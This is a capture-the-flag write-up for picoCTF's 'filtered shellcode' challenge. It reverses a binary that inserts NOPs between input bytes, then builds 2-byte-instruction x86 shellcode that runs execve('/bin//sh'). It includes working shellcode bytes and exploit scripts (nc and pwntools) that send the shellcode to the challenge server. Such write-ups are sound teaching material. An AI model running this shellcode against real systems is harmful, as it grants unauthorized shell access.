# FILTERED SHELLCODE

## OVERVIEW & IDEA

- This challenge give us a binary file, below is its informations.

```
λ ~/filtered_shellcode/ file fun

fun: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=325e35378982f451f374c7140c5249bb1c52ab18, not stripped

λ ~/filtered_shellcode/ checksec --file=fun

[*] '~/filtered_shellcode/fun'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

- Let disassemble the binary file and check some functions

![img](/picoCTF/filtered_shellcode/assets/main.png)

- `main()` is obfuscated, but we can see that, the `main()` just do the input and give the input and insert ` -112 = 0x90 ( it is opcode of nop instruction)` at the end of input if its size is odd. Then the program call the `execute()` with argument is address of input and input's size.

- When I check the `execute()`, it is also obfuscated.

![img](/picoCTF/filtered_shellcode/assets/execute.png)

- The program store the input at another location, and it inserts `0x90` at each index `i*4 + 2` and `i*4 + 3`, and each index `i*4 + 1` and `i*4 + 2` are input of user.

- Then the program execute that input as shellcode.

- So what the program actually does is insert `nop` instruction to each 2 bytes of user shellcode. Which will change the shellcode if the shellcode has instructions that take more than 2 bytes.

- The idea to make sure the shellcode is pretty easy, we just use shellcode that uses 2 bytes for one instruction. Then input it to program and done.

## DETAILS

- I use [defuse.ca](https://defuse.ca/online-x86-assembler.htm#disassembly) to disassemble the assembly code does the `execve("/bin//sh", 0, 0)`, the syscall is described in this [link](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit).

- The assembly code that I use.

```asm
xor ecx, ecx                    ; esp - 0x8
mov cl, 0x8
sub esp, ecx

mov eax, esp                    ; eax = esp
xor ebx, ebx                    ; ebx = 0

mov bl, 0x2f                    ; eax[0] = "/"
mov dword ptr [eax], ebx

mov bl, 0x62                    ; eax[1] = "b"
add al, 0x1
mov dword ptr [eax], ebx

mov bl, 0x69                    ; eax[2] = "i"
add al, 0x1
mov dword ptr [eax], ebx

mov bl, 0x6e                    ; eax[3] = "n"
add al, 0x1
mov dword ptr [eax], ebx

add al, 0x1                     ; eax[4] = "/"
mov bl, 0x2f
mov dword ptr [eax], ebx

mov bl, 0x2f                    ; eax[5] = "/"
add al, 0x1
mov dword ptr [eax], ebx

mov bl, 0x73                    ; eax[6] = "s"
add al, 0x1
mov dword ptr [eax], ebx

mov bl, 0x68                    ; eax[7] = "h"
add al, 0x1
mov dword ptr [eax], ebx

mov ebx, esp                    ; ebx = "/bin//sh"
xor eax, eax                    ; eax = 0xb
mov al, 0xb
xor edx, edx                    ; edx = 0
xor ecx, ecx                    ; ecx = 0

int 0x80                        ; execve("/bin//sh", 0, 0);
```

- Each instructions of code just use 2 bytes, so when this shellcode run through the `excecute()`, the program just insert 2 nops after each line of instruction.

![img](/picoCTF/filtered_shellcode/assets/disassembly.png)

- Then assemble the code and I got the shellcode of it

```
shellcode = "\x31\xC9\xB1\x08\x29\xCC\x89\xE0\x31\xDB\xB3\x2F\x89\x18\xB3\x62\x04\x01\x89\x18\xB3\x69\x04\x01\x89\x18\xB3\x6E\x04\x01\x89\x18\x04\x01\xB3\x2F\x89\x18\xB3\x2F\x04\x01\x89\x18\xB3\x73\x04\x01\x89\x18\xB3\x68\x04\x01\x89\x18\x89\xE3\x31\xC0\xB0\x0B\x31\xD2\x31\xC9\xCD\x80"
```

## EXPLOIT

```python
#! /usr/bin/python2
# filename: exp.py

shellcode = "\x31\xC9\xB1\x08\x29\xCC\x89\xE0\x31\xDB\xB3\x2F\x89\x18\xB3\x62\x04\x01\x89\x18\xB3\x69\x04\x01\x89\x18\xB3\x6E\x04\x01\x89\x18\x04\x01\xB3\x2F\x89\x18\xB3\x2F\x04\x01\x89\x18\xB3\x73\x04\x01\x89\x18\xB3\x68\x04\x01\x89\x18\x89\xE3\x31\xC0\xB0\x0B\x31\xD2\x31\xC9\xCD\x80"

print(shellcode)
```
```bash
python2 exp.py > temp.tmp
(cat temp.tmp; cat) | nc mercury.picoctf.net 40525
```

- or

```python
#! /user/bin/python2
# filename: exp.py

from pwn import *

p = remote("mercury.picoctf.net", 40525)

shellcode = "\x31\xC9\xB1\x08\x29\xCC\x89\xE0\x31\xDB\xB3\x2F\x89\x18\xB3\x62\x04\x01\x89\x18\xB3\x69\x04\x01\x89\x18\xB3\x6E\x04\x01\x89\x18\x04\x01\xB3\x2F\x89\x18\xB3\x2F\x04\x01\x89\x18\xB3\x73\x04\x01\x89\x18\xB3\x68\x04\x01\x89\x18\x89\xE3\x31\xC0\xB0\x0B\x31\xD2\x31\xC9\xCD\x80"

p.sendline(shellcode)
p.interactive()
```

## RESULT

![img](/picoCTF/filtered_shellcode/assets/result.png)

